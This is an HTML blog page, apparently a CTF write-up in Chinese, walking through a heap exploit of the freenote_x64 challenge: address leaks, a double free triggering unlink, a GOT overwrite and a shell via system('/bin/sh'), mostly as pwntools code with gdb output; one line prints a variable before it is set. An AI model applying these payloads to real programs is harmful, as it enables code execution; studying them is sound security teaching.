@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>freenote_x64堆漏洞double free利用 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="漏洞程序freenote_x64下载运行程序，这是一个note笔记本程序： 123456789➜  .&#x2F;freenote_x64&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;1. List Note2. New Note3. Edit Note4. Delete Note5. Exit&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#x3D">
+<meta property="og:type" content="article">
+<meta property="og:title" content="freenote_x64堆漏洞double free利用">
+<meta property="og:url" content="http://example.com/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞程序freenote_x64下载运行程序，这是一个note笔记本程序： 123456789➜  .&#x2F;freenote_x64&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;1. List Note2. New Note3. Edit Note4. Delete Note5. Exit&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#x3D">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2016-05-26T07:42:13.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.749Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-freenote-x64堆漏洞double-free利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/" class="article-date">
+  <time datetime="2016-05-26T07:42:13.000Z" itemprop="datePublished">2016-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      freenote_x64堆漏洞double free利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>漏洞程序<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1nuGARAp">freenote_x64</a>下载<br>运行程序，这是一个note笔记本程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  .&#x2F;freenote_x64</span><br><span class="line">&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
+<p>new_note和delete_note通过<code>malloc()</code>和<code>free()</code>来管理内存。<br>这个程序有两个漏洞，一个是建立新note的时候在note的结尾处没有加<code>\0</code>因此会造成堆或者栈的地址泄露，另一个问题就是在delete note的时候，并不会检测这个note是不是已经被删除过了，因此可以删除一个note两遍，造成double free。</p>
+<h3 id="泄露libc在内存中的地址"><a href="#泄露libc在内存中的地址" class="headerlink" title="泄露libc在内存中的地址"></a>泄露libc在内存中的地址</h3><p>因为note的结尾没有<code>\0</code>，因此在输出时会把后面的内容打印出来。因为freelist的头部保存在了libc的.bss段，因此我们可以通过新建两个note(必须两个，若只有一个，删除后没有fd，bk)再删除一个note，然后再建立一个新note的方法来泄露出libc在内存中的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span> * notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span> * notelen)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;\xb8&quot;</span>)</span><br><span class="line"><span class="comment"># 泄露libc的.bss段地址</span></span><br><span class="line">list_note()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0. &quot;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">leaklibcaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leaklibcaddr)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># freelist保存在libc的.bss段，0x3be7b8是freelist地址与libc起始地址之间的固定偏移（同一程序在不同机器上一样，不同程序不同，可由本地调试得知）</span></span><br><span class="line">libc_base_addr = leaklibcaddr - <span class="number">0x3be7b8</span></span><br><span class="line"><span class="comment"># 0x46640是system在libc.so中的偏移</span></span><br><span class="line">system_sh_addr = libc_base_addr + <span class="number">0x46640</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_sh_addr: &quot;</span> + <span class="built_in">hex</span>(system_sh_addr)</span><br><span class="line"><span class="comment"># 0x17ccdb是&quot;/bin/sh&quot;在libc.so中的偏移</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">binsh_addr = libc_base_addr + <span class="number">0x17ccdb</span></span><br></pre></td></tr></table></figure>
+<p>note_table的指针在<code>.bss</code>段的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A8 note_table_ptr      dq ?</span><br></pre></td></tr></table></figure>
+<p>用gdb attach到freenote_x64的进程上，查看指针值即为note_table的地址，查看note_table内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;x 0x6020A8</span><br><span class="line">0x6020a8:	0x0000000002328010 ; note_table address</span><br><span class="line"></span><br><span class="line">gdb-peda$ x&#x2F;8x 0x2328010</span><br><span class="line">0x2328010:	0x0000000000000100	0x0000000000000002</span><br><span class="line">0x2328020:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x2328030:	0x0000000002329830	0x0000000000000001</span><br><span class="line">0x2328040:	0x0000000000000080	0x00000000023298c0</span><br></pre></td></tr></table></figure>
+<p>note_table的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">head            chunk0                      chunk1</span><br><span class="line">|                 |                           |</span><br><span class="line">+--------+--------+--------+--------+---------+-</span><br><span class="line">| total  | in_use | in_use | note   | note    |</span><br><span class="line">| number | number |        | length | address | ...</span><br><span class="line">| 0x100  |        |        |        |         |</span><br><span class="line">+--------+--------+--------+--------+---------+-</span><br></pre></td></tr></table></figure>
+<p>这时note_table中有2条note，地址分别为0x2329830和0x23298c0。<br>删除note0后，查看note_table里的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;8x 0x2328010</span><br><span class="line">0x2328010:	0x0000000000000100	0x0000000000000001</span><br><span class="line">0x2328020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2328030:	0x0000000002329830	0x0000000000000001</span><br><span class="line">0x2328040:	0x0000000000000080	0x00000000023298c0</span><br></pre></td></tr></table></figure>
+<p>查看note0地址里的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;4x 0x2329830</span><br><span class="line">0x2329830:	0x00007ff508b507b8	0x00007ff508b507b8</span><br><span class="line">0x2329840:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>
+<p>fd为0x00007ff508b507b8，bk为0x00007ff508b507b8<br>新建一个内容为<code>&quot;\xb8&quot;</code>的note，打印内容就能泄露出fd的值。由fd的值计算出libc在内存的基址，从而算出<code>system()</code>和<code>&quot;/bin/sh&quot;</code>的实际地址。<br><code>system()</code>和<code>&quot;/bin/sh&quot;</code>在libc中的偏移可以如下得出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.19.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>
+<p>或者手工：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nm -D libc-2.19.so | grep system</span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露出heap在内存中的地址"><a href="#泄露出heap在内存中的地址" class="headerlink" title="泄露出heap在内存中的地址"></a>泄露出heap在内存中的地址</h3><p>如果让某个非使用中chunk的fd指向另一个chunk，并且让note的内容刚好接上，就可以把chunk在堆上的位置给泄露出来。这样我们就能得到堆（note_table）的基址:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;C&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;D&quot;</span>*notelen)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">list_note()</span><br><span class="line">p.recvuntil(<span class="string">&quot;0. AAAAAAAA&quot;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">leakheapaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leakheapaddr)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>删除note2和note0后freelist的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">freelist     note0空闲块   note2空闲块</span><br><span class="line">|             |            |</span><br><span class="line">+------+      +------+     +------+</span><br><span class="line">|      | --&gt;  |   fd |--&gt;  |   fd |</span><br><span class="line">|      |   &lt;--| bk   |  &lt;--| bk   |</span><br><span class="line">+------+      +------+     +------+</span><br><span class="line">| .... |</span><br></pre></td></tr></table></figure>
+<p>freelist是从头进，从尾出(FIFO)。先删除note2，note2加入list，再删除note0，note0从头加入。再新建一个内容为”AAAAAAAA”的note，会先使用note2空闲块，因此看一下note2的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;4x 0x2329950</span><br><span class="line">0x2329950:	0x00007ff508b507b8	0x0000000002329820</span><br><span class="line">0x2329960:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>新建note后，”AAAAAAAA”覆盖了0x00007ff508b507b8，正好接到0x0000000002329820（note0地址），使用list_note就能泄露出note0的地址，note0的地址减去0x1810就是note_table的地址。</p>
+<h3 id="使用double-free的漏洞触发unlink"><a href="#使用double-free的漏洞触发unlink" class="headerlink" title="使用double free的漏洞触发unlink"></a>使用double free的漏洞触发unlink</h3><p>将note0的地址指向note_table的地址。随后我们就可以通过编辑note0来编辑note_table了。通过编辑note_table我们把note0指向<code>free()</code>函数在got表中的地址，把note1指向<code>&quot;/bin/sh&quot;</code>在内存中的地址。然后我们编辑note0把free()函数在got表中的地址改为<code>system()</code>的地址。最后我们执行delete note1操作。因为我们把note1的地址指向了<code>&quot;/bin/sh&quot;</code>，所以程序会执行system(“/bin/sh”)，最终达到了我们的目的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;C&quot;</span>*notelen)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># note_table_address = note0-&gt;address - 0x1810</span></span><br><span class="line"><span class="comment"># note0-&gt;pos = note_table_address + 0x20</span></span><br><span class="line"><span class="comment"># fd = note0-&gt;pos - 0x18</span></span><br><span class="line">fd = leakheapaddr - <span class="number">0x1810</span> + <span class="number">0x20</span> - <span class="number">0x18</span> </span><br><span class="line"><span class="comment"># bk = note0-&gt;pos - 0x10</span></span><br><span class="line">bk = fd + <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
+<p>对应的堆结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-note0</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note1</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note2</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+<p>fd指向note0在note_table中的位置减0x18，bk指向note0在note_table中的位置减0x10</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># fake_prevsize + fake_size + fake_fd + fake_bk + data</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(notelen+<span class="number">1</span>) + p64(fd) + p64(bk) + <span class="string">&quot;A&quot;</span> * (notelen - <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># fake_prevsize + size + data</span></span><br><span class="line">payload += p64(notelen) + p64(notelen+<span class="number">0x10</span>) + <span class="string">&quot;A&quot;</span> * notelen</span><br><span class="line"><span class="comment"># prevsize + size + data</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(notelen+<span class="number">0x11</span>)+ <span class="string">&quot;\x00&quot;</span> * (notelen<span class="number">-0x20</span>)</span><br><span class="line"></span><br><span class="line">new_note(payload)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>对应的堆结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-note0</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">| fake_prev |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_size |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_fd   |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_bk   |</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note1</span><br><span class="line">| fake_prev |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_size |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note2</span><br><span class="line">|     0     |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+<p>delete note1就会触发unlink，使note0的地址变成<code>note0-&gt;pos-0x18</code>，这时对note0进行编辑即对note_table进行编辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(notelen) + p64(<span class="number">1</span>) + p64(<span class="number">0x8</span>) + p64(free_got) + <span class="string">&quot;A&quot;</span>*<span class="number">16</span> + p64(binsh_addr)</span><br><span class="line">payload2 += <span class="string">&quot;A&quot;</span>* (notelen*<span class="number">3</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">0</span>, payload2)</span><br><span class="line">edit_note(<span class="number">0</span>, p64(system_sh_addr))</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>完整<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1dFbjZnb">exp</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/binary/10638">http://drops.wooyun.org/binary/10638</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/" data-id="ckhe7o4my004pchl74cvvd1f6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/05/30/ARM%E5%9F%BA%E7%A1%80/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ARM基础
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/05/07/Heap-Overflow-Using-Unlink/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Heap Overflow Using Unlink</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" 